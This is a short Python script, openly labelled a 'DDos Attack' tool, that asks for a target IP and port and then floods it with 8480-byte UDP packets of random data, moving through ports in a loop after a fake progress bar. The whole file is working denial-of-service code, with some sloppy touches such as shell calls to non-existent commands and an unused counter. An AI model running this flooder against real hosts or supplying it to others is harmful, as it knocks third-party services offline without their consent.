import sys
import os
import time
import socket
import random



sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(8480)

print (bytes)
os.system("clear")
os.system("DDos Attack")

ip = input("IP  Target: ") 
port = int(input("Port       : "))  

os.system("clear")
os.system("Attack Starting")
print("[                    ] 0% ")
time.sleep(5)
print("[=====               ] 25%")
time.sleep(5)
print("[==========          ] 50%")
time.sleep(5)
print("[===============     ] 75%")
time.sleep(5)
print("[====================] 100%")
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     
     if port == 65534:
       port = 1
       break